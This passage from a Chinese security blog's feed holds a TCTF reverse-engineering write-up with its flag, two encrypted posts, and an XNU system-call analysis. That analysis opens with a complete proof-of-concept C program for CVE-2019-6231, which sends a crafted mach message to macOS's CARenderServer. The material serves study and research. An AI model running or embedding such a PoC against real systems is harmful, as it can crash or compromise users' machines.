interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Welcome to my blog, enter password to read.
    
    </summary>
    
      <category term="me" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/me/"/>
    
    
  </entry>
  
  <entry>
    <title>XNU系统调用深度解析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/XNU%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E6%B7%B1%E5%BA%A6%E8%A7%A3%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/</id>
    <published>2019-01-30T05:53:00.000Z</published>
    <updated>2019-03-05T15:30:52.474Z</updated>
    
    <content type="html"><![CDATA[<h3 id="XNU系统调用深度解析"><a href="#XNU系统调用深度解析" class="headerlink" title="XNU系统调用深度解析"></a>XNU系统调用深度解析</h3><blockquote><p>从一个函数分析到系统调用的内核实现</p></blockquote><h4 id="由一段POC而起"><a href="#由一段POC而起" class="headerlink" title="由一段POC而起"></a>由一段POC而起</h4><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;mach/i386/kern_return.h&gt;#include &lt;mach/mach_traps.h&gt;#include &lt;servers/bootstrap.h&gt;#include &lt;dirent.h&gt;#include &lt;sys/stat.h&gt;#include &lt;time.h&gt;#include &lt;dlfcn.h&gt;#include &lt;unistd.h&gt;typedef struct quartz_register_client_s quartz_register_client_t;struct quartz_register_client_s {        mach_msg_header_t header;        uint32_t body;        mach_msg_port_descriptor_t ports[4];        char padding[12];};typedef struct quartzcore_mach_msg quartzcore_mach_msg_t;struct quartzcore_mach_msg{        mach_msg_header_t header;        char msg_body[712];};uint64_t get_filesize(const char *fn){        struct stat st;        stat(fn, &amp;st);        uint64_t fsize = st.st_size;        return fsize;};int main(int argc, const char * argv[]) {        mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL;        task_get_bootstrap_port(mach_task_self(), &amp;bs_port);        const char *render_service_name = &quot;com.apple.CARenderServer&quot;;        kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;);        kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p);        if (kr != KERN_SUCCESS) {                return -1;        }        printf(&quot;[*] Get service of %s successully!\n&quot;, render_service_name);        quartz_register_client_t msg_register;        memset(&amp;msg_register, 0, sizeof(msg_register));        msg_register.header.msgh_bits =        MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) |        MACH_MSGH_BITS_COMPLEX;        msg_register.header.msgh_remote_port = p;        msg_register.header.msgh_local_port = mig_get_reply_port();        msg_register.header.msgh_id = 40202;  // _XRegisterClient        msg_register.body = 4;        msg_register.ports[0].name = mach_task_self();        msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[1].name = mach_task_self();        msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[2].name = mach_task_self();        msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR;        msg_register.ports[3].name = mach_task_self();        msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND;        msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR;        kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG,                                    sizeof(quartz_register_client_t), sizeof(quartz_register_client_t),                                    msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                return -1 ;        }        mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c);        uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30);        printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\n&quot;,context_port,conn_id);        char *crash_log = &quot;crash.data&quot;; //size is 736.        FILE *fp = fopen(crash_log, &quot;rb&quot;);        if(fp == NULL){                printf(&quot;fopen error!\n&quot;);        }        uint64_t fsize = get_filesize(crash_log);        void *msg_buf = malloc(fsize);        memset(msg_buf, 0, fsize);        fread(msg_buf, fsize, 1, fp);        quartzcore_mach_msg_t qc_mach_msg = {0};        qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;        qc_mach_msg.header.msgh_remote_port = context_port;        qc_mach_msg.header.msgh_id = 40002;        memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body));        *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1;  // Ports count        memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc);        *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id;        kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);        if (kr != KERN_SUCCESS) {                printf(&quot;[-] Send message failed: 0x%d\n&quot;, kr);                return -1 ;        }        return 0;}</code></pre><p>里面的macho函数<code>mach_msg()</code>到底后面执行到哪里？于是展开一段追踪</p><p>从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1    frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msglibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;: pushq  %rbp    0x7fff79299695 &lt;+1&gt;: movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" 